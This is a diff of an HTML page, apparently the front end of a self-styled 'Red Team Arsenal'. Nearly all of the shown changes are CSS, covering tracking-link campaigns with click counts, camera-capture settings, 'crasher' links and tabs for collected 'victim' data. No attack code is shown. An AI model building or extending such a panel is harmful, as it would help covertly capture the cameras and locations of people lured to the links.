@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MR_MOMIN_🌍 | Elite Framework</title>
+    <title>CYBER PHANTOM | Elite Red Team Arsenal</title>
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -17,363 +17,1148 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
     <style>
+        :root {
+            --primary: #00f0ff;
+            --primary-dark: #00c8d4;
+            --secondary: #ff3864;
+            --accent: #7000ff;
+            --warning: #ffb800;
+            --success: #00ff9d;
+            --dark: #0a0a0f;
+            --darker: #050508;
+            --card-bg: rgba(20, 20, 30, 0.6);
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(0, 240, 255, 0.15);
+            --glow: 0 0 40px rgba(0, 240, 255, 0.15);
+            --glow-red: 0 0 40px rgba(255, 56, 100, 0.2);
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
         }
+        
         body {
-            background: radial-gradient(circle at 10% 30%, #0a0f1e, #03050a);
+            background: var(--darker);
             min-height: 100vh;
-            padding: 2rem;
+            font-family: 'Inter', sans-serif;
+            color: #e8e8e8;
+            overflow-x: hidden;
             position: relative;
+            line-height: 1.6;
         }
-        /* Animated background */
-        .bg-glow {
+        
+        /* Animated Background */
+        .bg-animation {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle at 70% 30%, rgba(0, 255, 0, 0.05), rgba(0, 0, 0, 0.2));
-            pointer-events: none;
             z-index: 0;
+            overflow: hidden;
+            background: radial-gradient(ellipse at bottom, #1a1a2e 0%, #0a0a0f 100%);
         }
+        
+        .bg-grid {
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background-image: 
+                linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 20s linear infinite;
+            transform: perspective(1000px) rotateX(60deg);
+            transform-origin: center top;
+            opacity: 0.4;
+        }
+        
+        @keyframes gridMove {
+            0% { transform: perspective(1000px) rotateX(60deg) translateY(0); }
+            100% { transform: perspective(1000px) rotateX(60deg) translateY(50px); }
+        }
+        
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: var(--primary);
+            border-radius: 50%;
+            animation: float 15s infinite;
+            opacity: 0.3;
+            box-shadow: 0 0 6px var(--primary);
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.8; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
+        
+        /* Main Container */
         .container {
             max-width: 1400px;
             margin: 0 auto;
+            padding: 2rem;
             position: relative;
-            z-index: 2;
+            z-index: 10;
         }
-        /* Premium Glass Header */
-        .premium-header {
-            background: rgba(10, 20, 30, 0.65);
-            backdrop-filter: blur(12px);
-            border-radius: 2rem;
-            padding: 1rem 2rem;
+        
+        /* Header */
+        .header {
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 1.5rem 2.5rem;
             margin-bottom: 2rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 1rem;
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(0, 255, 0, 0.3);
+            gap: 1.5rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), var(--glow);
+            position: relative;
+            overflow: hidden;
         }
-        .logo-area h1 {
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), var(--accent), transparent);
+            animation: scan 3s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+        }
+        
+        .logo-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 1.8rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #0f0, #5f5);
+            color: var(--dark);
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.4);
+            animation: pulse 3s ease-in-out infinite;
+            position: relative;
+        }
+        
+        .logo-icon::after {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 18px;
+            background: linear-gradient(135deg, var(--primary), var(--accent), var(--secondary));
+            z-index: -1;
+            opacity: 0.6;
+            animation: rotate 3s linear infinite;
+            filter: blur(8px);
+        }
+        
+        @keyframes rotate {
+            0% { filter: hue-rotate(0deg) blur(8px); }
+            100% { filter: hue-rotate(360deg) blur(8px); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 30px rgba(0, 240, 255, 0.4); }
+            50% { transform: scale(1.02); box-shadow: 0 0 50px rgba(0, 240, 255, 0.6); }
+        }
+        
+        .logo-text h1 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff 0%, var(--primary) 50%, var(--accent) 100%);
             -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            letter-spacing: -0.5px;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
-        .logo-area p {
-            font-size: 0.7rem;
-            color: #0f0;
+        
+        .logo-text p {
+            font-size: 0.8rem;
+            color: rgba(0, 240, 255, 0.7);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            font-weight: 500;
+            margin-top: 0.2rem;
         }
-        .uid-info {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 2rem;
-            padding: 0.5rem 1rem;
-            border: 1px solid rgba(0, 255, 0, 0.4);
+        
+        .operator-badge {
+            background: var(--glass);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 1rem 1.5rem;
             display: flex;
             align-items: center;
             gap: 1rem;
+            backdrop-filter: blur(10px);
         }
-        .uid-label {
+        
+        .operator-icon {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(112, 0, 255, 0.2));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-size: 1.1rem;
+            border: 1px solid var(--border);
+        }
+        
+        .operator-info {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .operator-label {
+            font-size: 0.7rem;
+            color: rgba(0, 240, 255, 0.6);
+            text-transform: uppercase;
+            letter-spacing: 2px;
             font-weight: 600;
-            color: #0f0;
         }
-        .uid-value {
-            font-family: monospace;
+        
+        .operator-id {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
             font-weight: 700;
-            background: #0a1a0a;
-            padding: 0.2rem 0.8rem;
-            border-radius: 2rem;
-            color: #0f0;
+            color: #fff;
+            letter-spacing: 1px;
         }
+        
+        /* Developer Badge - NEW */
+        .developer-badge {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.1), rgba(112, 0, 255, 0.1));
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 1rem 1.5rem;
+            backdrop-filter: blur(20px);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3), var(--glow);
+            animation: developerPulse 3s ease-in-out infinite;
+        }
+        
+        @keyframes developerPulse {
+            0%, 100% { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3), 0 0 20px rgba(0, 240, 255, 0.2); }
+            50% { box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3), 0 0 40px rgba(0, 240, 255, 0.4); }
+        }
+        
+        .developer-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            color: var(--dark);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
+        }
+        
+        .developer-info {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .developer-label {
+            font-size: 0.7rem;
+            color: rgba(0, 240, 255, 0.6);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+        
+        .developer-name {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+        
+        .developer-globe {
+            display: inline-block;
+            animation: globeSpin 2s linear infinite;
+        }
+        
+        @keyframes globeSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
         /* Cards */
         .card {
-            background: rgba(10, 20, 30, 0.7);
-            backdrop-filter: blur(8px);
-            border-radius: 1.5rem;
-            padding: 1.5rem;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 2rem;
             margin-bottom: 2rem;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(0, 255, 0, 0.2);
-            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
         }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            opacity: 0.5;
+        }
+        
         .card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(0, 255, 0, 0.4);
+            transform: translateY(-4px);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4), var(--glow);
+            border-color: rgba(0, 240, 255, 0.3);
         }
+        
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid rgba(0, 240, 255, 0.1);
+        }
+        
+        .card-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(112, 0, 255, 0.15));
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            color: var(--primary);
+            border: 1px solid var(--border);
+            transition: var(--transition);
+        }
+        
+        .card:hover .card-icon {
+            transform: rotate(5deg) scale(1.05);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+        }
+        
+        .card-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        /* Feature Grid */
         .feature-grid {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
             gap: 1rem;
             margin: 1.5rem 0;
         }
+        
         .feature-card {
-            background: rgba(0, 20, 0, 0.6);
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            border-radius: 1rem;
-            padding: 0.8rem 0.5rem;
+            background: var(--glass);
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            border-radius: 16px;
+            padding: 1.5rem 1rem;
             text-align: center;
             cursor: pointer;
-            transition: all 0.2s ease;
-            backdrop-filter: blur(4px);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
         }
+        
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 240, 255, 0.1), transparent);
+            transition: left 0.5s;
+        }
+        
+        .feature-card:hover::before {
+            left: 100%;
+        }
+        
         .feature-card i {
-            font-size: 1.6rem;
-            color: #0f0;
-            margin-bottom: 0.3rem;
+            font-size: 1.8rem;
+            color: var(--primary);
+            margin-bottom: 0.8rem;
+            display: block;
+            transition: var(--transition);
+        }
+        
+        .feature-card span {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.6);
+            text-transform: uppercase;
+            letter-spacing: 1px;
             display: block;
         }
-        .feature-card span {
-            font-size: 0.7rem;
-            font-weight: 500;
-            color: #cfc;
+        
+        .feature-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.15);
         }
-        @media (max-width: 640px) {
-            .feature-card span { font-size: 0.6rem; }
-            .feature-card i { font-size: 1.4rem; }
+        
+        .feature-card:hover i {
+            transform: scale(1.2);
+            color: var(--accent);
         }
+        
         .feature-card.selected {
-            background: rgba(0, 255, 0, 0.2);
-            border-color: #0f0;
-            box-shadow: 0 0 12px rgba(0, 255, 0, 0.4);
-            transform: scale(1.02);
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(112, 0, 255, 0.1));
+            border-color: var(--primary);
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.2);
         }
-        .btn-primary {
-            background: linear-gradient(95deg, #0a0, #0a0);
-            border: none;
-            color: #000;
-            padding: 0.9rem;
-            border-radius: 1rem;
-            font-weight: 700;
-            width: 100%;
-            cursor: pointer;
-            transition: 0.2s;
+        
+        .feature-card.selected i {
+            color: #fff;
         }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 0 15px #0f0;
+        
+        .feature-card.selected span {
+            color: #fff;
         }
+        
+        /* Toggle Switches */
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem 1.2rem;
+            background: var(--glass);
+            border-radius: 16px;
+            margin: 1rem 0;
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            transition: var(--transition);
+        }
+        
+        .toggle-container:hover {
+            border-color: rgba(0, 240, 255, 0.2);
+            background: rgba(0, 240, 255, 0.05);
+        }
+        
         .toggle-switch {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 1rem 0;
-            background: rgba(0, 20, 0, 0.5);
-            padding: 0.5rem;
-            border-radius: 2rem;
+            position: relative;
+            width: 56px;
+            height: 30px;
         }
-        .shorten-check {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin: 1rem 0;
+        
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
         }
+        
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.1);
+            border-radius: 30px;
+            transition: 0.3s;
+            border: 1px solid rgba(0, 240, 255, 0.2);
+        }
+        
+        .toggle-slider::before {
+            position: absolute;
+            content: "";
+            height: 24px;
+            width: 24px;
+            left: 3px;
+            bottom: 2px;
+            background: linear-gradient(135deg, #fff, #e0e0e0);
+            border-radius: 50%;
+            transition: 0.3s;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+        
+        input:checked + .toggle-slider {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-color: var(--primary);
+        }
+        
+        input:checked + .toggle-slider::before {
+            transform: translateX(26px);
+            background: #fff;
+        }
+        
+        .toggle-label {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.8);
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+        
+        .toggle-label i {
+            color: var(--primary);
+            margin-right: 0.6rem;
+            width: 20px;
+        }
+        
+        /* Custom Camera Settings */
         .camera-custom {
             display: none;
-            margin-top: 1rem;
-            padding: 1rem;
-            background: rgba(0, 20, 0, 0.6);
-            border-radius: 1rem;
-            border: 1px solid rgba(0, 255, 0, 0.3);
+            margin-top: 1.5rem;
+            padding: 1.5rem;
+            background: var(--glass);
+            border-radius: 16px;
+            border: 1px solid var(--border);
         }
-        .camera-custom h4 {
-            margin-bottom: 0.8rem;
-            color: #0f0;
+        
+        .camera-custom.active {
+            display: block;
+            animation: slideDown 0.3s ease;
         }
+        
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
         .camera-grid {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 1rem;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
         }
-        .camera-option {
+        
+        .input-group {
             display: flex;
             flex-direction: column;
-            gap: 0.3rem;
+            gap: 0.6rem;
         }
-        .camera-option label {
+        
+        .input-group label {
             font-size: 0.8rem;
+            color: var(--primary);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .input-group input, .input-group select {
+            padding: 0.9rem 1rem;
+            border-radius: 12px;
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
             font-weight: 500;
-            color: #0f0;
+            transition: var(--transition);
         }
-        .camera-option select, .camera-option input {
-            padding: 0.4rem;
-            border-radius: 0.5rem;
-            border: 1px solid #0f0;
-            background: #0a1a0a;
-            color: #0f0;
+        
+        .input-group input:focus, .input-group select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.1);
+            transform: translateY(-1px);
         }
-        .link-box {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 1rem;
-            padding: 1rem;
-            margin-top: 1rem;
-            border-left: 4px solid #0f0;
+        
+        /* URL Input */
+        .url-input-group {
+            margin: 1.5rem 0;
         }
-        .link-text {
-            word-break: break-all;
-            background: #0a1a0a;
-            padding: 0.8rem;
-            border-radius: 0.8rem;
-            font-family: monospace;
+        
+        .url-input-group label {
+            display: block;
             font-size: 0.8rem;
-            margin: 0.5rem 0;
-            color: #afa;
+            color: var(--primary);
+            margin-bottom: 0.6rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
         }
+        
+        .url-input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border-radius: 16px;
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+        
+        .url-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.1);
+        }
+        
+        .url-input::placeholder {
+            color: rgba(255,255,255,0.3);
+        }
+        
+        /* Buttons */
+        .btn-primary {
+            width: 100%;
+            padding: 1.2rem;
+            border-radius: 16px;
+            border: none;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: var(--dark);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0, 240, 255, 0.3);
+            margin-bottom: 1rem;
+        }
+        
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(0, 240, 255, 0.4);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+        
+        .btn-danger {
+            width: 100%;
+            padding: 1.2rem;
+            border-radius: 16px;
+            border: none;
+            background: linear-gradient(135deg, var(--secondary), #ff0055);
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(255, 56, 100, 0.3);
+        }
+        
+        .btn-danger::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn-danger:hover::before {
+            left: 100%;
+        }
+        
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(255, 56, 100, 0.5);
+        }
+        
+        .btn-secondary {
+            padding: 0.8rem 1.5rem;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            background: var(--glass);
+            color: var(--primary);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 0.6rem;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-secondary:hover {
+            background: var(--primary);
+            color: var(--dark);
+            box-shadow: var(--glow);
+            transform: translateY(-2px);
+            border-color: var(--primary);
+        }
+        
+        /* Link Box */
+        .link-box {
+            margin-top: 1.5rem;
+            padding: 1.5rem;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.08), rgba(112, 0, 255, 0.04));
+            border: 1px solid var(--primary);
+            border-radius: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .link-box.danger {
+            background: linear-gradient(135deg, rgba(255, 56, 100, 0.08), rgba(255, 0, 85, 0.04));
+            border-color: var(--secondary);
+        }
+        
+        .link-box::before {
+            content: '🔗';
+            position: absolute;
+            top: 50%;
+            right: 20px;
+            transform: translateY(-50%);
+            font-size: 3rem;
+            opacity: 0.05;
+        }
+        
+        .link-box.danger::before {
+            content: '⚠️';
+        }
+        
+        .link-label {
+            font-size: 0.8rem;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 0.6rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            font-weight: 600;
+        }
+        
+        .link-box.danger .link-label {
+            color: var(--secondary);
+        }
+        
+        .link-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: #fff;
+            background: rgba(0,0,0,0.4);
+            padding: 1rem;
+            border-radius: 12px;
+            word-break: break-all;
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            line-height: 1.5;
+        }
+        
+        .link-box.danger .link-text {
+            border-color: rgba(255, 56, 100, 0.2);
+        }
+        
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .stat-card {
+            background: var(--glass);
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            border-radius: 20px;
+            padding: 1.5rem;
+            text-align: center;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--primary);
+            box-shadow: 0 15px 40px rgba(0, 240, 255, 0.15);
+        }
+        
+        .stat-icon {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(112, 0, 255, 0.15));
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            font-size: 1.5rem;
+            color: var(--primary);
+            border: 1px solid var(--border);
+            transition: var(--transition);
+        }
+        
+        .stat-card:hover .stat-icon {
+            transform: scale(1.1);
+            box-shadow: 0 0 25px rgba(0, 240, 255, 0.3);
+        }
+        
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 0.3rem;
+        }
+        
+        .stat-label {
+            font-size: 0.85rem;
+            color: rgba(0, 240, 255, 0.7);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+        
+        /* Chart Container */
+        .chart-container {
+            background: var(--glass);
+            border-radius: 16px;
+            padding: 1.2rem;
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            height: 300px;
+        }
+        
+        /* Campaign List */
         .campaign-list {
-            max-height: 600px;
+            max-height: 500px;
             overflow-y: auto;
         }
+        
         .campaign-item {
-            background: rgba(0, 20, 0, 0.5);
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin-bottom: 0.8rem;
+            background: var(--glass);
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            transition: var(--transition);
         }
+        
+        .campaign-item:hover {
+            border-color: var(--primary);
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.1);
+            transform: translateX(4px);
+        }
+        
+        .campaign-item.crasher {
+            border-color: rgba(255, 56, 100, 0.3);
+            background: linear-gradient(135deg, rgba(255, 56, 100, 0.05), transparent);
+        }
+        
+        .campaign-item.crasher:hover {
+            box-shadow: 0 10px 30px rgba(255, 56, 100, 0.15);
+            border-color: var(--secondary);
+        }
+        
         .campaign-header {
             display: flex;
             align-items: center;
-            gap: 0.8rem;
-            flex-wrap: wrap;
-        }
-        .campaign-link {
-            font-size: 0.7rem;
-            word-break: break-all;
-            font-family: monospace;
-            color: #afa;
-            flex: 1;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-        .campaign-clicks {
-            background: #0f0;
-            color: #000;
-            padding: 0.2rem 0.6rem;
-            border-radius: 1rem;
-            font-weight: bold;
-            font-size: 0.7rem;
-        }
-        .copy-camp, .delete-camp {
-            background: #0a1a0a;
-            border: 1px solid #0f0;
-            border-radius: 1rem;
-            padding: 0.2rem 0.6rem;
-            cursor: pointer;
-            font-size: 0.7rem;
-            color: #0f0;
-        }
-        .delete-camp {
-            color: #f66;
-        }
-        .victim-item {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 1rem;
-            padding: 1rem;
-            margin-top: 1rem;
-            border: 1px solid #0f0;
-        }
-        .victim-header {
-            display: flex;
-            justify-content: space-between;
-            border-bottom: 1px solid #0f0;
-            padding-bottom: 0.5rem;
-            margin-bottom: 0.8rem;
-            flex-wrap: wrap;
-        }
-        .victim-tabs {
-            display: flex;
-            gap: 0.5rem;
+            gap: 1rem;
             flex-wrap: wrap;
             margin-bottom: 1rem;
         }
+        
+        .campaign-link {
+            flex: 1;
+            min-width: 200px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+            background: rgba(0,0,0,0.4);
+            padding: 0.8rem 1rem;
+            border-radius: 12px;
+            border: 1px solid rgba(112, 0, 255, 0.2);
+            word-break: break-all;
+        }
+        
+        .campaign-item.crasher .campaign-link {
+            color: var(--secondary);
+            border-color: rgba(255, 56, 100, 0.2);
+        }
+        
+        .campaign-stats {
+            display: flex;
+            gap: 0.6rem;
+        }
+        
+        .stat-badge {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: var(--dark);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        
+        .campaign-item.crasher .stat-badge {
+            background: linear-gradient(135deg, var(--secondary), #ff0055);
+            color: #fff;
+        }
+        
+        .campaign-actions {
+            display: flex;
+            gap: 0.6rem;
+        }
+        
+        /* Victim Data Tabs */
+        .victim-item {
+            background: rgba(0,0,0,0.4);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-top: 1rem;
+            border: 1px solid rgba(0, 240, 255, 0.15);
+        }
+        
+        .victim-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            padding-bottom: 1rem;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid rgba(0, 240, 255, 0.15);
+        }
+        
+        .victim-id {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.1rem;
+            color: var(--primary);
